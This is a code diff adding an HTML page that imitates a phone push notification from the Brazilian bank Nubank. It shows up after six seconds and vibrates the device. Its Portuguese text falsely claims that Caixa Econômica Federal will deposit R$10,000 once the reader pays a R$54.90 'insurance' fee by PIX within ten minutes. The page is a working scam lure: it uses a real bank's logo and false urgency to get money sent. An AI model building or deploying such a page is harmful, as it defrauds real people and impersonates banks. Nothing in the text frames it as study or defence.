@@ -1,0 +1,120 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phone Notification Screen</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"></link>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: transparent;
+        }
+        @keyframes slideDown {
+            from {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        @keyframes slideUp {
+            from {
+                transform: translateY(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+        }
+        .notification {
+            animation: slideDown 0.3s ease-out forwards;
+            opacity: 0;
+            transform: translateY(-100%);
+        }
+        .notification.hide {
+            animation: slideUp 0.3s ease-in forwards;
+        }
+    </style>
+</head>
+<body class="bg-transparent">
+    <!-- Notification -->
+    <div id="notification" class="mt-4 mx-auto bg-white rounded-3xl p-3 shadow-lg notification" style="max-width: calc(100% - 25px); display: none;">
+        <div class="flex justify-between items-start">
+            <div class="flex-grow pr-2">
+                <div class="flex items-center mb-1">
+                    <div class="w-6 h-6 rounded-[10px] mr-2 overflow-hidden">
+                        <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Nubank logo" class="w-full h-full object-cover">
+                    </div>
+                    <span class="text-gray-700 text-sm">Nubank • agora <i class="fas fa-chevron-down text-xs"></i></span>
+                </div>
+                <div class="text-black text-base font-bold mb-1 flex items-center whitespace-nowrap overflow-hidden" style="text-overflow: ellipsis;">
+                    <span class="mr-2" style="font-size: 1.1em;">💰</span>
+                    Você vai receber R$10.000,00
+                </div>
+            </div>
+            <div class="w-12 h-12 flex-shrink-0 overflow-hidden rounded-[10px]">
+                <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Nubank logo" class="w-full h-full object-cover">
+            </div>
+        </div>
+        <div class="text-gray-600 text-sm w-full mt-0.5" style="word-break: break-word;">
+            Caixa Econômica Federal está aguardando o pagamento do seguro no valor de R$54,90 para depositar R$10.000,00 em sua conta Nubank. Copie o código PIX e realize o pagamento em até 10 minutos ou a transação será bloqueada.
+        </div>
+    </div>
+
+    <script>
+        function vibrateDevice() {
+            if ("vibrate" in navigator) {
+                navigator.vibrate(200);
+            }
+        }
+
+        const notification = document.getElementById('notification');
+
+        function showNotification() {
+            notification.style.display = 'block';
+            vibrateDevice();
+            setTimeout(() => {
+                hideNotification();
+            }, 15000);  // Changed to 15 seconds
+        }
+
+        function hideNotification() {
+            notification.classList.add('hide');
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 300);
+        }
+
+        let startX, startY, moveX, moveY;
+
+        function addSwipeToHide() {
+            notification.addEventListener('touchstart', (e) => {
+                startX = e.touches[0].clientX;
+                startY = e.touches[0].clientY;
+            });
+
+            notification.addEventListener('touchmove', (e) => {
+                moveX = e.touches[0].clientX;
+                moveY = e.touches[0].clientY;
+                
+                const distanceX = moveX - startX;
+                const distanceY = moveY - startY;
+
+                if (Math.abs(distanceX) > 50 || distanceY < -50) {
+                    hideNotification();
+                }
+            });
+        }
+
+        addSwipeToHide();
+
+        // Show notification after 6 seconds
+        setTimeout(showNotification, 6000);
+    </script>
+</body>
+</html>
